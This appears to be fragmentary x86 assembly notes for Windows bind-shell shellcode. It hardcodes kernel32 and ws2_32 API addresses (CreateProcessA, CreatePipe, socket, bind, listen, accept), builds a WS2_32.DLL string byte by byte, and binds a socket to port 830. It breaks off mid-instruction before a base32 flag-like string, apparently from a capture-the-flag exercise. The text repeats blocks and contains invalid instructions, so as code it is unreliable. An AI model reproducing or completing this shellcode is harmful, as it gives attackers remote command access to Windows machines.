push esp
push 0x202
call[ebp + 28]


			mov eax,0x7c81d827
			mov [ebp+4],  eax;	CreatePipe
			mov eax,0x7c80236b
			mov  [ebp+8],  eax;	CreateProcessA
			mov eax,0x7c860817
			mov  [ebp+12], eax;	PeekNamedPipe	
			mov eax,0x7c810e17
			mov  [ebp+16], eax;	WriteFile
			mov eax,0x7c801812
			mov  [ebp+20], eax;	ReadFile
			mov eax,0x7c81cafa
			mov  [ebp+24], eax;	ExitProcess
			mov eax,0x71a26a55
			mov  [ebp+28], eax;	WSAStartup
			mov eax,0x71a24211
			mov  [ebp+32], eax;	socket
			mov eax,0x71a24480
			mov  [ebp+36], eax;	bind
			mov eax,0x71a28cd3
			mov  [ebp+40], eax;	listen
			mov eax,0x71a31040
			mov  [ebp+44], eax;	accept
			mov eax,0x71a24c27
			mov  [ebp+48], eax;	send
			mov eax,0x71a2676f
			mov  [ebp+52], eax;	recv
			mov eax,0x0
			mov [ebp+56],0
			mov [ebp+60],0
			mov [ebp+64],0
			mov [ebp+68],0
			mov [ebp+72],0

			
kernel32 LibHandle = //0x7c800000
createpipe LibHandle = //0x7c81d827
CreateProcessA LibHandle = //0x7c80236b
PeekNamedPipe LibHandle = //0x7c860817
WriteFile LibHandle = //0x7c810e17
read LibHandle = //0x7c801812
Proc LibHandle = //0x7c81cafa
ws2_32 LibHandle = //0x71a20000
WSAStartup LibHandle = //0x71a26a55
socket LibHandle = //0x71a24211
bind LibHandle = //0x71a24480
listen LibHandle = //0x71a28cd3
accept LibHandle = //0x71a31040
send LibHandle = //0x71a24c27
recv LibHandle = //0x71a2676f





__asm
{
	push ebp    ;
    mov ebp,esp    ;				
    xor eax,eax   ;
    push eax;
	push eax;
	push eax;
    mov byte ptr [ebp-0bh],57h; W
    mov byte ptr [ebp-0ah],53h; S  LoadLibrary("WS2_32.DLL");	
    mov byte ptr [ebp-09h],32h;	2
    mov byte ptr [ebp-08h],5Fh;	_
    mov byte ptr [ebp-07h],33h;	3
    mov byte ptr [ebp-06h],32h;	2
    mov byte ptr [ebp-05h],2Eh;	.
    mov byte ptr [ebp-04h],44h;	D
    mov byte ptr [ebp-03h],4Ch;	L
    mov byte ptr [ebp-02h],4Ch;	L
    lea eax,[ebp-0bh]; 
    push eax    ;
    mov eax,0x71a20000;
    call eax  ; 
}




push ebp;
mov ebp,esp;
xor eax,eax;
push eax;

push 0x4C4C442E32;
push 0x335F325357;

lea eax,[ebp-0bh];
push eax;
mov eax,0x71a20000;
call eax;


mov esi,esp;
push 6
push 1
push 2
call[ebp + 32]
mov ebp,eax


xor edi,edi            //先构造server
push edi
push edi
mov eax,0x3E030002
push  eax           ; port 830  AF_INET
mov esi, esp                 //把server地址赋给esi
push  0x10                           ; length
push esi                          ; &server
push ebx                         ; socket
call [ebp + 36]                ; bind

;ret = listen(listenFD,2)
inc edi
inc edi
push edi			;2
push ebx			;socket
call [ebp + 40]	


;int iAddrSize = sizeof(server)
;SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);

push 0x10;
push edi , [esp]
push 


MZWGCZ33GM2TEMRSMQZTALJUGM4WKLJUMFTGELJZGFTDILLBMJSWEYZXGNTGKMBVMN6Q 







